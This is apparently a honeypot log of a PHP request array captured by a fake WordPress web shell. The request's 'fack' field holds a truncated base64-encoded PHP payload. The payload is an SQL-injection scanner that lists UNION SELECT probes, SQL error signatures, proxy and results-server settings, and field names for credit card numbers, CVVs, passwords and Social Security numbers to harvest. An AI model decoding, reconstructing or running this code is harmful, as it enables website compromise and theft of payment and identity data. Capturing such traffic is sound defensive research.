
_SERVER
Array
(
    [UNIQUE_ID] => WhhxvNVetVmI7bWMt89J3AAAAAE
    [SCRIPT_URL] => /wp-content/plugins/wp_module/wp_tags.php
    [SCRIPT_URI] => http://stratigery.com/wp-content/plugins/wp_module/wp_tags.php
    [HTTP_HOST] => stratigery.com
    [HTTP_ACCEPT] => */*
    [HTTP_ACCEPT_ENCODING] => UTF-8
    [CONTENT_LENGTH] => 352273
    [CONTENT_TYPE] => application/x-www-form-urlencoded
    [HTTP_EXPECT] => 100-continue
    [PATH] => /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
    [SERVER_SIGNATURE] => 
    [SERVER_SOFTWARE] => Apache/2.4.29 (Unix) PHP/7.1.12
    [SERVER_NAME] => stratigery.com
    [SERVER_ADDR] => 162.246.45.144
    [SERVER_PORT] => 80
    [REMOTE_ADDR] => 82.146.44.105
    [DOCUMENT_ROOT] => /srv/http/stratigery/htdocs
    [REQUEST_SCHEME] => http
    [CONTEXT_PREFIX] => 
    [CONTEXT_DOCUMENT_ROOT] => /srv/http/stratigery/htdocs
    [SERVER_ADMIN] => bediger@stratigery.com
    [SCRIPT_FILENAME] => /srv/http/stratigery/htdocs/fake_wp/wso.php
    [REMOTE_PORT] => 59294
    [GATEWAY_INTERFACE] => CGI/1.1
    [SERVER_PROTOCOL] => HTTP/1.1
    [REQUEST_METHOD] => POST
    [QUERY_STRING] => key=sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG
    [REQUEST_URI] => /wp-content/plugins/wp_module/wp_tags.php?key=sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG
    [SCRIPT_NAME] => /wp-content/plugins/wp_module/wp_tags.php
    [PHP_SELF] => /wp-content/plugins/wp_module/wp_tags.php
    [REQUEST_TIME_FLOAT] => 1511551420.666
    [REQUEST_TIME] => 1511551420
)

_REQUEST
Array
(
    [key] => sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG
    [fack] => CgoKZXJyb3JfcmVwb3J0aW5nKDApOwovL2Vycm9yX3JlcG9ydGluZyhFX0FMTCk7CnNldF90aW1lX2xpbWl0KDApOwoKCgpjbGFzcyBJbmplY3RvckNvbXBvbmVudCB7CgkKCWZ1bmN0aW9uIF9fY29uc3RydWN0KCkgewoJCQoJCQoJCS8vcGFyZW50OjpfX2NvbnN0cnVjdCgpOwoJCQkKCQkKCQkKCgkkdGhpcy0+Y2FyZHMgPSBhcnJheSgnY3Z2JywnX2NhcmQnLCdjdmMnLCdjYXJkX251bScsJ2NhcmQgbnVtJywnY3JlZGl0X2NhcmQnLCdjYXJkX251bWJlcicsJ2NjY29kZScsJ2V4cGlyYXRpb24nLCdjYXJkX2NjdicsJ2NjX2NvZGUnLCdjY19ob2xkZXInLCdjY190eXBlJywnY2FyZF9leHAnLCdleHBfY2FyZCcsJ2V4cF95ZWFyJywnbnVtY2MnLCdjY251bScsJ2NjX251bScsJ2NjIG51bScsJ251bV9jYycsJ251bWJlcl9jYycsJ251bWJlcnNfY2MnLCdjcmVkaXRjYXJkJyk7CgkKCSR0aGlzLT5wYXNzd29yZHMgPSBhcnJheSgncGFzcycsJ3BzdycsJ3BhaXMnLCdwYXJvbCcsJ2NsYXZlJywncHdvcmQnLCdjb250cmFzZcOxYScsJ2hhc2gnLCdtZHAnLCdoZXNsbycsJ2zDtnNlbm9yZCcsJ3B3ZCcsJ2plbHN6bycsJ3NlbmhhJyk7CgkKCSR0aGlzLT5sb2dpbnMgPSBhcnJheSgnbG9naW4nLCdsb2dhbicpOwoJCgkkdGhpcy0+c3NuX2RvYiA9IGFycmF5KCdzc24nLCdkb2InLCdzb2NpYWxfc2VjdXJpdHlfbnVtYmVyJywnc29jaWFsLXNlY3VyaXR5LW51bWJlcicsJ3NvY2lhbHNlY3VyaXR5bnVtYmVyJywnbW1uJyk7CgkKCS8v0J7RiNC40LHQutC4INC60L7RgtC+0YDRi9C1INC/0YDQuCDQv9GA0LXQtNCy0LDRgNC40YLQtdC70YzQvdC+0Lwg0YLQtdGB0YLQuNGA0L7QstCw0L3QuNC4INCz0L7QstC+0YDRj9GCINC90LDQvCDRh9GC0L4g0YLRg9GCINC10YHRgtGMINGB0LrRg9C70Y8sINGB0LDQvNGL0Lkg0L/RgNC+0YHRgtC+0Lkg0YHQv9C+0YHQvtCxINC+0L/RgNC10LTQtdC70LXQvdC40Y8gRXJyb3JCYXNlZAoJICR0aGlzLT5lcnJvcl90ZXh0X215c3FsID0gYXJyYXkoJ3JlcXVpcmVfJywnZmlsZV9nZXRfY29udGVudHMnLCdmb3BlbicsJ2luY2x1ZGUoJywnbXlzcWxfcmVzdWx0JywnbXlzcWxfZmV0Y2hfYXJyYXknLCdleGVjdXRlIHF1ZXJ5JywnbXlzcWxfZmV0Y2hfb2JqZWN0JywnbXlzcWxfbnVtX3Jvd3MnLCdteXNxbF9mZXRjaF9hc3NvYycsJ215c3FsX2ZldGNoX3JvdycsJ0ZhdGFsIGVycm9yJywnU3ludGF4IGVycm9yJywnTXlTUUwnLCdhdCBsaW5lJywnaW4geW91ciBTUUwgc3ludGF4JywnRGF0YWJhc2UgcXVlcnkgZXJyb3InKTsKCSAKCSAvL9Ci0LXQttC1INGB0LDQvNGL0LUg0L7RiNC40LHQutC4INGH0YPRgtC+0Log0L7RgNC10LfQsNC90L3Ri9C1INC00LvRjyDQvtC/0YDQtdC00LXQu9C90LjRjyBzcWxpINC40L3RitC10LrRhtC40Lkg0LIg0LfQsNCz0L7Qu9C+0LLQutCw0YUg0J/QntCh0KIg0YTQvtGA0LzQsNGFCgkgJHRoaXMtPmVycm9yX3RleHRfbXlzcWxfaGVhZCA9IGFycmF5KCdmaWxlX2dldF9jb250ZW50cycsJ2ZvcGVuJywnbXlzcWxfcmVzdWx0JywnbXlzcWxfZmV0Y2hfYXJyYXknLCdleGVjdXRlIHF1ZXJ5JywnbXlzcWxfZmV0Y2hfb2JqZWN0JywnbXlzcWxfbnVtX3Jvd3MnLCdteXNxbF9mZXRjaF9hc3NvYycsJ215c3FsX2ZldGNoX3JvdycsJ0ZhdGFsIGVycm9yJywnU3ludGF4IGVycm9yJywnaW4geW91ciBTUUwgc3ludGF4JywnRGF0YWJhc2UgcXVlcnkgZXJyb3InKTsKCQoJLy8nTWljcm9zb2Z0IE9MRSBEQiBQcm92aWRlcicsCgkkdGhpcy0+ZXJyb3JfdGV4dF9tc3NxbCA9IGFycmF5KCdVbmNsb3NlZCBxdW90YXRpb24gbWFyaycsJ0RhdGFiYXNlIGVycm9yIG9uIHBhZ2UnLCdJbmNvcnJlY3Qgc3ludGF4IG5lYXInLCdTZXJ2ZXIgRXJyb3IgaW4nLCdEZXRhaWxlZCBFcnJvcicsJ01pY3Jvc29mdCBKRVQgRGF0YWJhc2UgRW5naW5lIGVycm9yJywnU3ludGF4IGVycm9yIChtaXNzaW5nIG9wZXJhdG9yKScpOwoJCgkkdGhpcy0+ZW5nZWVuX2FkZHIgPSBhcnJheSgndHViZScsJ2dvb2dsZScsJ2FjdD1IZWxwJywnbW9kdWxlPWhlbHAnLCduYW1lPU5ld3MnLCduYW1lPVBhZ2VzJywnbmFtZT1Db250ZW50Jywnb3B0aW9uPWNvbScsJ29wdGlvbj1jb21fY29udGVudCcsJ3ZpZXd0b3BpYy5waHAnLCd0aHJlYWQucGhwJywnc2hvd3RvcGljPScsJ3Nob3d0aHJlYWQucGhwJyk7CgkKCSR0aGlzLT5rb25lY19mb3JfY2hlayA9IGFycmF5KCcrQU5EKzE9MScsJyUyNytBTkQrJTI3eCUyNz0lMjd4JywnJTIyK0FORCslMjJ4JTIyPSUyMngnKTsKCgkkdGhpcy0+dmFyaWFudF9xdWVyeSA9IAoJCWFycmF5KCcxJz0+YXJyYXkoCgkJLy9hcnJheSgiMTExMTExMTExMTExMScrVU5JT04rU0VMRUNUKyIsIithbmQrJzAnPScwIiksCgkJYXJyYXkoIjExMTExMTExMTExMTEnIFVOSU9OIFNFTEVDVCAiLCctLSArJyksCgkJYXJyYXkoJzExMTExMTExMTExMTErVU5JT04rU0VMRUNUKycsJystLSsnKSwKCQlhcnJheSgiMTExMTExMTExMTExMSUyNytVTklPTitTRUxFQ1QrIiwiKy0tKy8qK29yZGVyK2J5KyUyN2FzIiksCgkJYXJyYXkoJzExMTExMTExMTExMTElMjIrVU5JT04rU0VMRUNUKycsJystLSsvKitvcmRlcitieSslMjJhcycpLAoJCS8vYXJyYXkoIjExMTExMTExMTElMjcrYW5kKyIsIithbmQrJTI3MSUyNz0lMjcxIiksCgkJKSk7CgkJCgkKCSR0aGlzLT52YXJpYW50X3F1ZXJ5X21zc3FsID0gCgkJYXJyYXkoJzEnPT5hcnJheSgKCQlhcnJheSgnMTExMTExMTExMTExMStVTklPTitTRUxFQ1QrJywnJyksCgkJYXJyYXkoJzExMTExMTExMTExMTErVU5JT04rU0VMRUNUKycsIi0tIiksCgkJLy9hcnJheSgiMTExMTExMTExMSUyNythbmQrIiwiK2FuZCslMjcxJTI3PSUyNzEiKQoJCSkpOwkKCgkJCgkJCgkkdGhpcy0+aF9zID0gYXJyYXkoCgkndXJsJz0+JycsCgkncmVmZXJlcic9Pidnb29nbGUuY29tJywKCSd1c2VyYWdlbnQnPT4nbW96aWxsYScsCgknZm9yd2FyZGVyJz0+JzguOC44LjgnLAoJJ2Nvb2tpZXMnPT4nVXNlcj1hZG1pbiY7cGFzc3dvcmQ9MTIzJjtsb2dpbj1hZG1pbicsCgkncG9zdF9zdGF0aWMnPT4nJywKCSdjb29raWVzX3N0YXRpYyc9PicnLAoJJ2hlYWQnPT4nJywKCSdwb3N0Jz0+JycsCgknaHR0cHMnPT5mYWxzZSk7CQoJCSAKCQoKCQkKCQkKCSR0aGlzLT5wYWdpbmF0ZSA9IGFycmF5KCdsaW1pdCcgPT4gMjUwLCdvcmRlcicgPT4gYXJyYXkoJ2lkJyA9PiAnZGVzYycpKTsKCSR0aGlzLT5zdG9wd29yZCA9IGFycmF5KCd0cmlhbCcsJ1RSSUFMJywnbnVsbCcsJ05VTEwnLCdudWwnLCdOVUwnLCcnLCcwJywndGVzdCcsJ3llcycsJ25vJywnbm90IGNhY2hlZCcsJ1JKREJQNCcpOwoJJHRoaXMtPnBhdGggPSBhcnJheSgpOwoJJHRoaXMtPmNhcmRfZHVibGVzID0gYXJyYXkoKTsJCgkkdGhpcy0+dmFsaWRfc29ja3MgPSBhcnJheSgpOwoJJHRoaXMtPnNzYl9kb2IgPSBhcnJheSgpOwoJCgkkdGhpcy0+cHJlZ190YWJsZSA9IGZhbHNlOwoJJHRoaXMtPnByZWdfbG9naW4gPSBmYWxzZTsKCSR0aGlzLT5wcmVnX3Bhc3MgID0gZmFsc2U7CgkkdGhpcy0+bXlzcWwyID0gZmFsc2U7IC8vINC00LvRjyDQvtC00LjQvdC+0YfQvdC+0LPQviDQtNCw0LzQv9C40L3Qs9CwCgkkdGhpcy0+ZGVmYXVsdF9kaXJzID0gZmFsc2U7CgkKCQoJJHRoaXMtPmRvbWVuID0gJyc7CgkkdGhpcy0+c2hlbGxfdXJsID0gJyc7CgkkdGhpcy0+Y29ubmVjdGlvbiA9Jyc7CgkkdGhpcy0+Y29ycCA9ICcnOwoJJHRoaXMtPmNvcnBfZ29vZCA9ICcnOwoJJHRoaXMtPnRhYmxlT3JkZXIgPSAnJzsKCQoJJHRoaXMtPnNoYWcgPSAxNTsKCSR0aGlzLT5wbHVzID0gMTA7CgkkdGhpcy0+bGltICA9IDUwMDAwMDsKCSR0aGlzLT5saW0yICA9IDUwMDAwMDsKCSR0aGlzLT5yYXogPSAxMDAwOwoJJHRoaXMtPmRlbGV0ZSA9IDUwMDsKCSR0aGlzLT5wc24gPSAxMDAwMDsKCSR0aGlzLT5waWQgPSAwOwogICAKCQoJJHRoaXMtPmtleXdvcmQ7ICAKCSR0aGlzLT5rZXlfd29yZDsgCgkkdGhpcy0+a2V5d29yZF9jb3VudCA9IDA7CgkkdGhpcy0+bWV0aG9kID0gZmFsc2U7IAoJJHRoaXMtPmNvbHVtbiA9IGZhbHNlOyAKCSR0aGlzLT51c2VyID0gZmFsc2U7CgkkdGhpcy0+dmVyc2lvbiA9IGZhbHNlOwoJJHRoaXMtPndvcmsgPSBmYWxzZTsgIAoJJHRoaXMtPnVybHMgPSBhcnJheSgpOyAgCgkkdGhpcy0+c3Bvc29iID0gZmFsc2U7CgkkdGhpcy0+Z2V0X2J5X2Vycm9yID0gZmFsc2U7CgkkdGhpcy0+Z2V0X2J5X2Vycm9yX2xlZ2h0ID0gMDsKCQoJCgkvL9GE0YPQvdC60YbQuNC4INC00LvRjyDQvNC10YLQvtC00LAgVElNRSBCQVNFRChTTEVFUCkKCSR0aGlzLT5pZCA9ICcnOwoJJHRoaXMtPnVybCA9ICcnOwoJJHRoaXMtPnNldCA9ICcnOwoJJHRoaXMtPnRtcCA9ICcnOwoJJHRoaXMtPnJldCA9IGFycmF5KCk7CgkkdGhpcy0+YXJfc3FsID0gYXJyYXkoKTsKCSR0aGlzLT5zY25kID0gJyc7CgkkdGhpcy0+c2VjID0nJzsKCSR0aGlzLT5kYXRhID0gYXJyYXkoKTsKCSR0aGlzLT5zcWxpID0gYXJyYXkoKTsKCSR0aGlzLT5hcnJheV9zcWwgPSBhcnJheSgpOwoJJHRoaXMtPnNxbGlfY29uZmlnID0gYXJyYXkoKTsKCSR0aGlzLT5kYnMgPSAnJzsKCSR0aGlzLT50YWJsZSA9ICcnOwoJJHRoaXMtPnRhYmxlcyA9ICcnOwoJJHRoaXMtPmNvdW50X3RhYmxlcyA9ICcnOwoJJHRoaXMtPmNvbHVtbnMgPSAnJzsKCSR0aGlzLT5jb21tZW50ID0gJyc7CgkkdGhpcy0+c2xlZXBfY2hlY2sxID0gdHJ1ZTsKCSR0aGlzLT5zbGVlcF9jaGVjazIgPSBmYWxzZTsKCSR0aGlzLT5zbGVlcF9tZXRvZCA9IGZhbHNlOwoJJHRoaXMtPnNsZWVwX2RhdGEgPSAnJzsKCSR0aGlzLT5wcm94eSA9ICcnOwoJJHRoaXMtPmVycm9yID0gMDsKCSR0aGlzLT5kZXNjID0gMDsvL2Rlc2MKCSR0aGlzLT5kZXNjX2VuYWJsZSA9IGZhbHNlOwoJJHRoaXMtPmR1bXBmaWxlID0gZmFsc2U7CgkkdGhpcy0+bnVsbCA9IDA7CgkkdGhpcy0+bWV0aG9kX29sZCA9ZmFsc2U7Ly/QtNC70Y8g0LrQsNC60L7Qs9C+INC80LXRgtC+0LTQsCDQv9C+INC30LDQu9C40LLQutC1INGH0LXRgNC10Lcgc2xlZXAKCQoJCgkvL9GE0YPQvdC60YbQuNC4INC00LvRjyDQv9Cw0YPQutCwCgkkdGhpcy0+Z2V0Zm9ybT0nJzsKCSR0aGlzLT5wb3N0Zm9ybT0nJzsKCSR0aGlzLT5mb3JtX3VybCA9ICcnOwoJJHRoaXMtPmZvcm1faG9zdCA9ICcnOwoJJHRoaXMtPmZvcm1fc2V0ID0gYXJyYXkoKTsKCSR0aGlzLT5zbGVlcCA9IDE7CgkkdGhpcy0+dGFibGVzX2ZpbmQgPSAwOwoJJHRoaXMtPmxvZ2dpbmcgPSAxOwoJJHRoaXMtPmZpbGUgPSAnJzsKCSR0aGlzLT5jcm93bGVyID0gZmFsc2U7CgkkdGhpcy0+Y3Jvd2xlcl91cmwgPScnOwoJJHRoaXMtPmwxID0gYXJyYXkoKTsKCSR0aGlzLT5sMiA9IGFycmF5KCk7CgkkdGhpcy0+bDFfbWFpbiA9IGFycmF5KCk7CgkkdGhpcy0+bDFfZ29vZ2xlID0gYXJyYXkoKTsKCSR0aGlzLT5hMSA9IGFycmF5KCk7CgkkdGhpcy0+YTIgPSBhcnJheSgpOwoJJHRoaXMtPmZpbmQgPSAnJzsKCSR0aGlzLT5tc3NxbCA9IGZhbHNlOwoJJHRoaXMtPnNpdGVtYXAgPSBmYWxzZTsJCgkkdGhpcy0+d2hhdF90b19maW5kID0gJyc7CgkkdGhpcy0+YmFkX2JvZHkgPSAwOwoKCQoJLy8vLy8vLy8vLy8vLy8vLy8vLy8KCQoKCQoJCgkKCS8vQ9C70YPQttC10LHQvdGL0LUg0YTRg9C90LrRhtC40LgKCSR0aGlzLT5odHRwcyA9IGZhbHNlOwoJJHRoaXMtPmNvbnRlbnRfZW1wdHkgPSAwOyAvLyDQtdGB0LvQuCDRgdGC0YDQsNC90LjRhtCwIDIg0YDQsNC30LAg0L7RgtC00LDRgdGC0YzRgdGPINC/0YPRgdGC0L7QuSwg0YLQviDQstC30LvQvtC8INC/0YDQtdC60YDQsNGC0LjRgtGB0Y8sINC80L7QttC10YIg0LTQvtC80LXQvSDQvdC1INGB0YPRidC10YHRgtCy0YPQtdGCINC40LvQuCDRh9GC0L4g0YLQviDQtdGJ0LUuCgkkdGhpcy0+aHR0cHNfY2hlY2s9ZmFsc2U7Ly/QsdGL0LvQsCDQu9C4INC/0YDQvtC50LTQtdC90LAg0L/RgNC+0LLQtdGA0LrQsCDQvdCwIGh0dHBzCgkkdGhpcy0+cG9zdF9mdWxsID0gZmFsc2U7IC8v0LHRg9C00YPRidCw0Y8g0LfQsNCz0L7RgtC+0LLQutCwINC00LvRjyDQn9Ce0KHQoiDRhNC+0YDQvCDQv9GA0L7QstC10YDRj9GC0Ywg0L7RgtC/0YDQsNCy0LrQvtC5INCz0L7RgtC+0LLRi9GFINC00LDQvdC90YvRhSDQtNC70Y8g0YDRg9GHCiAgIAogIAoJCgoJCgkKCQovLy8vLy8vLy8vLy8g0JTQntCc0JXQndCrIC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCgkkdGhpcy0+ZG9tZW5fZW5hYmxlPWZhbHNlOyAgLy8g0JXRgdC70Lgg0LHRg9C00LXRgtC1INCz0YDRg9C30LjRgtGMINGH0LjRgdGC0L4g0LTQvtC80LXQvdGLINCwINC90LUg0YHRgdGL0LvQutC4INGC0L4g0YHRgtCw0LLQuNGC0YzQtSBUUlVFLCDQv9GA0Lgg0YfQtdC60LUg0YjQtdC70L7QsiDQvtC90Lgg0LHRg9C00YPRgiDQsdC+0LvQtdC1INGC0YjQsNGC0LXQu9GM0L3QviDQv9GA0L7QstC10YDRj9GC0YzRgdGPIC0+b2xvbG9fZG9tZW4ucGhwCgkkdGhpcy0+dGltZV9jcm93bGVyID0gMjUwOyAgIC8v0JLRgNC10LzRjyDQstGL0L/QvtC70L3QtdC90LjRjyBQT1NUINC30LDQv9GA0L7RgdCwINC/0YDQuCBlcnJvcl9maW5kZXIg0L3QsCDQo9C00LDQu9C10L3QvdC+0Lwg0YjQtdC70LUKCSR0aGlzLT50aW1lX2V2YWwgPSAxMjA7ICAgIC8vINCS0YDQtdC80Y8g0LLRi9C/0L7Qu9C90LXQvdC40Y8gUE9TVCDQt9Cw0L/RgNC+0YHQsCDQv9GA0Lgg0YLQtdGB0YLQuNGA0L7QstCw0L3QuNC4INC90LAg0KPQtNCw0LvQtdC90L3QvtC8INGI0LXQu9C1CgkkdGhpcy0+dGltZW91dCA9IDIwOwoJJHRoaXMtPnRpbWVfc2xlZXAgPSAzMDsKCSR0aGlzLT50aW1lX3NsZWVwMiA9IDMwOwoJCgkKCSR0aGlzLT50aW1lMl9tYWluID0gMTU7Ly/QstGA0LXQvNGPINC00LvRjyDQv9C10YDQstC+0Lkg0YHRgtGA0LDQvdC40YbRiwoJJHRoaXMtPmxpbWl0X2NyYXdsZXIgPSAxMDAwOy8v0L7QsdGJ0LXQtSDQutC+0LvQuNGH0LXRgdGC0LLQviDQu9C40L3QutC+0Lwg0YHQutC+0Log0LzQvtC20LXRgiDQv9GA0L7QudGC0Lgg0L/QsNGD0Log0JTQm9CvINCh0KDQldCU0J3QldCT0J4g0JLQl9Cb0J7QnNCQINCV0KHQm9CYINCd0KPQltCd0J4g0JrQkNCn0JXQodCi0JLQldCd0J3QniDQn9Cg0K/QnCDQodCa0JDQndCY0KLQrCDQotCeINCc0J7QltCd0J4g0JggMTDQmiDQn9Ce0KHQotCQ0JLQmNCi0KwKCSR0aGlzLT5saW1pdF9wYWdlMCA9IDI1MDsvLyDQutC+0LvQuNGH0LXRgdGC0LLQviDRgdGB0YvQu9C+0Log0YEg0L/QtdGA0LLQvtC5INGB0YLRgNCw0L3QuNGG0YssINGH0YLQvtCx0Ysg0L/QsNGD0LrRgyDQsdGL0LvQviDQutGD0LTQsCDQsdC10LbQsNGC0YwKCSR0aGlzLT5sMV9tYWluX2Zvcm1fc2xpY2UgPSAyMDsgLy8g0LTQsNC70LXQtSDQv9Cw0YPQuiDRgdC+0LHQtdGAINC70LjQvdC60L7QsiDRgSDQs9C70LDQstC90L7QuSDRgdGC0YDQsNC90LjRhtGLINC4INC/0L7QuNGJ0LXQvCDRgtCw0Lwg0YTQvtGA0LzRiy4KCQoJCgkKCSR0aGlzLT5zZXJ2ZXJfdXJsID0gJ3N1cC5jb20nOy8v0LLQsNC20L3Ri9C5INC/0LDRgNCw0LzQtdGC0YAg0LLQv9C40YjRgtC1INCy0LDRiCBJUCDQutGD0LTQsCDQsdGD0LTRg9GCINGB0LvQsNGC0YzRgdGPINGA0LXQt9GD0LvRjNGC0LDRgi4KCS8vJHRoaXMtPnNlcnZlcl91cmwgID0kX1NFUlZFUlsnSFRUUF9IT1NUJ107CgkKCQoJJHRoaXMtPmh0YWNjZXNzX2F1dGggPSAnJzsKCQoJCgkKCQoJCgkvL9Cg0JDQkdCe0KLQkCDRgSDRgtCw0LHQu9C40YbQtdC5INC60YPQtNCwINC80L7QttC90L4g0LPRgNGD0LfQuNGC0Ywg0LzQvdC+0LPQviDQu9C40L3QutC+0LIg0YEg0L7QtNC90L7Qs9C+INGB0LDQudGC0LAsINGC0LDQuiDQuiDQv9GA0LjQvNC10YDRgyDRgtC+0YfQvdC+INCy0YHQtSBQT1NUINGE0L7RgNC80Ysg0L/QviBOINGI0YLRg9C6INGBINC00L7QvNC10L3QsCDRgdC+0YXRgNCw0L3Rj9GO0YLRgdGPCgkKCQoJCgkKCQoJCgkKCS8v0YTRg9C90LrRhtC40Lgg0L7RgtCy0LXRh9Cw0Y7RidC40LUg0LfQsCDRh9C10LrQuNC90LMg0YHRgdGL0LvQvtC6CgkkdGhpcy0+ZXJyb3JfbGltaXQgPSA1MDAwOy8v0L/RgNC+0LLQtdGA0Y/RgtGMINGA0LDQt9C+0Lwg0YHRgdGL0LvQvtC6INGB0LrQvtC70YzQutC+INCyINC/0YDQtdC00LLQsNGA0LjRgtC10LvRjNC90L7QvCDRgtC10YHRgtC40YDQvtCy0LDQvdC40Lgg0L7Qv9GC0LjQvNCw0LvRjNC90L4gMjAwMC01MDAwCgkKCSR0aGlzLT5lcnJvcl9saW1pdF9wb3N0ID0gMTsKCQoJJHRoaXMtPnRhYmxlX3Bvc3QgPSAncG9zdHNfYWxsJzsKCQoJJHRoaXMtPm11bHRpX2xpbWl0ID0gNDA7Ly/Rg9C20LUg0LLRgtC+0YDQvtC5INGI0LDQsyDRh9C10Log0L3QsCDQutC+0LvQvtC90LrQuCDQv9C+0LTQutC70Y7Rh9C10L3QuNC1INC6INCR0JQg0LLRi9Cy0L7QtCDQstC10YDRgdC40LgsINC60YDRg9GC0LjRgiDQtNC+0LvQs9C+LiDQnNC+0LbQvdC+INC/0L7QuNCz0YDQsNGC0YzRgdGPINGBINC/0LDRgNCw0LzQtdGC0YDQvtC8LgoJCgkkdGhpcy0+Y29sdW1uX2xpbWl0ID0gNDA7IC8v0YHQutC+0LvRjNC60L4g0LrQvtC70L7QvdC+0Log0L/RgNC+0LLQtdGA0Y/RgtGMINC/0YDQuCDQv9C+0LTQsdC+0YDQtQoJCgkkdGhpcy0+ZXJyb3JfdGltZSA9IDEwMDsgLy/RgdC60L7Qu9GM0LrQviDQttC00LDRgtGMINCy0YDQtdC80LXQvdC4INC/0L4g0L7RgtC00LDRh9C1INGBINGI0LXQu9C70LAg0L/RgNC4INC/0YDQtdC00LLQsNGA0LjRgtC10LvRjNC90L7QvCDRgtC10YHRgtC40YDQvtCy0LDQvdC40Lggc3RlcE9uZQoJJHRoaXMtPm11bHRpX3RpbWUgPSAyNTA7IC8v0YHQutC+0LvRjNC60L4g0LbQtNCw0YLRjCDQstGA0LXQvNC10L3QuCDQv9C+INC+0YLQtNCw0YfQtSDRgSDRiNC10LvQu9CwINC/0YDQuCDRg9C20LUg0L/QvtC70L3QvtGG0LXQvdC90L7QvCDRh9C10LrQtSwg0L/QvtC00LHQvtGA0LUg0LrQvtC70L7QvdC+0Log0Lgg0L/RgNC+0YfQtdC1IHN0ZXBUd28sIDE1MCDRgdGC0LDQstC40Lsg0Y/QstC90L4g0L7Rh9C10L3RjCDQvNCw0LvQviwg0L/RgNC+0L/Rg9GB0LrQuCDQuNC00YPRggoJCgkKCS8v0KTRg9C90LrRhtC40Lgg0L7RgtCy0LXRh9Cw0Y7RidC40LUg0LfQsCDQv9GA0L7QutGB0LgsINC70YPRh9GI0LUg0L3QtSDQuNGB0L/QvtC70YzQt9C+0LLQsNGC0Ywg0L/RgNC+0LHQuNCyINC/0LDQtNCw0LXRgiDQvdCwIDMwJQoJJHRoaXMtPnByb3h5X2VuYWJsZSA9IHRydWU7IC8v0L/RgNC+0LrRgdC4INC10YHQu9C4INGBINC/0LDRgdC+0Lwg0YLQviDQtNC10LvQsNGC0YwgaXA6cG9ydDpsb2dpbjpwYXNzIAoJJHRoaXMtPnByb3h5X3VybCA9ICdwcm94eS50eHQnOyAvL2FwcC93ZWJyb290L3NvY2tzLnR4dCDQodCu0JTQkCBIVFRQINC/0YDQvtC60YHQuCDQuNC80LXQvdC+CgkkdGhpcy0+dXJsID0gImh0dHA6Ly9waWNhYnUucnUiOyAgIC8v0YHQsNC50YIg0L3QsCDQutCw0LrQvtC5INGH0LXQutCw0LXRgtGB0Y8g0L/RgNC+0LrRgdC4CgkkdGhpcy0+dXJsMiA9ICJodHRwOi8vd3d3Lm1zdS5ydSI7IC8v0LfQsNC/0LDRgdC90L7QuSDRgdCw0LnRgiDQtNC70Y8g0YfQtdC60LAg0L/RgNC+0LrRgdC4INCy0YLQvtGA0L7QuQoJJHRoaXMtPnRleHQgPSAidGl0bGUiOyAvL9C10YHQu9C4INGC0LDQutC+0LUg0YHQu9C+0LLQviDQvdCw0LnQtNC10YIg0L/RgNC4INC30LDRhdC+0LTQtSDRh9C10YDQtdC3INC/0YDQvtC60YHQuCDQvdCwINGB0LDQudGCLCDRgtC+INC30L3QsNGH0LjRgiDRgNCw0LHQvtGH0LjQuQoJJHRoaXMtPnVhZ2VudCA9ICIiOyAKCSR0aGlzLT5yZWZlcmVyID0gImdvb2dsZS5ydSI7CgkkdGhpcy0+cHJveHlfY2hlY2tfZnVsbCA9IHRydWU7IC8v0Y3RgtC+0YIg0L/QsNGA0LDQvNC10YLRgCDQvtGC0LLQtdGH0LDQtdGCINC30LAg0L/RgNC+0LLQtdGA0LrRgyDQv9GA0L7QutGB0LXQuSDQsiDQsdC+0LvQtdC1INGI0LjRgNC+0LrQvtC8INGE0L7RgNC80LDRgtC1INC90LAg0YDQtdCw0LvRjNC90L7QvCDQstC30LvQvtC80LUg0LrQsNC6INGI0LXQu9C70YsKCSR0aGlzLT5wcm94eV91cmxfZnVsbF9jaGVjayA9J3Bvc3Q6Omh0dHA6Ly90ZXN0cGhwLnZ1bG53ZWIuY29tL3VzZXJpbmZvLnBocD91bmFtZT10ZXN0JnBhc3M9dGVzdCc7CQoJJHRoaXMtPnByb3h5X2Fuc3dlciA9ICdteXNxbF9mZXRjaF9hcnJheSc7CgkKCQoJCgkKCS8v0LLQutC70Y7Rh9C10L3QuNC1INGA0LDQt9C70LjRh9C90YvRhSDQv9GA0L7QstC10YDQvtC6CgkkdGhpcy0+c3NuX2NoZWNrID0gdHJ1ZTsgLy/QstC60LvRjtGH0LjRgtGMINC/0L7QuNGB0LogU1NOINC10YHQu9C4INC90YPQttC10L0KCSR0aGlzLT5jY19jaGVjayA9IHRydWU7IC8v0LLQutC70Y7Rh9C40YLRjCDQv9C+0LjRgdC6INCh0KEKCSR0aGlzLT5oZWFkX2NoZWNrICA9ZmFsc2U7IC8vINCy0LrQu9GO0YfQuNGC0Ywg0L/RgNC+0LLQtdGA0Y/RgtGMINC30LDQs9C+0LvQvtCy0LrQuAoJJHRoaXMtPm1zc3FsX2NoZWNrID10cnVlOyAvLyDQstC60LvRjtGH0LjRgtGMINC/0YDQvtCy0LXRgNC60YMgbXNzcWwg0JIg0J/QoNCe0KbQldCh0KHQlSAg0J3QkNCf0JjQodCQ0J3QmNCvCgkkdGhpcy0+c2VhcmNoX2VtYWlsID0gdHJ1ZTsKCQoJCgkKCS8v0LTQu9GPINC30LDQs9C+0LvQvtCy0LrQvtCyCgkkdGhpcy0+aGVhZGVyID0gZmFsc2U7IC8v0LLQvtC30LLRgNCw0YnQsNGC0Ywg0LfQsNCz0L7Qu9C+0LLQutC4INCyIENVUkwKCSR0aGlzLT5oZWFkX2VuYWJsZSA9IGZhbHNlOyAvL9CV0YHQu9C4INC40LTQtdGCINGA0LDQsdC+0YLQsCDRgSBIRUFEINC40LvQuCBQT1NUINGE0L7RgNC80LDQvNC4LCDRgtC+INCyINGE0YPQvdC60YbQuNC4IHN0YXJ0INC90LUg0LHRg9C00LXRgiDRh9C10LrQsNGC0Ywg0L3QsCBlcnJvcgoJJHRoaXMtPnBvc3RfZW5hYmxlID1mYWxzZTsKCQoJCgkvL9GE0YPQvdC60YbQuNC4INC+0YLQstC10YfQsNGO0YIg0LfQsCDQstGL0LLQvtC0INC/0L7Qu9C10LfQvdC+0Lkg0LjQvdGE0L7RgNC80LDRhtC40LgKCSR0aGlzLT5sb2dfZW5hY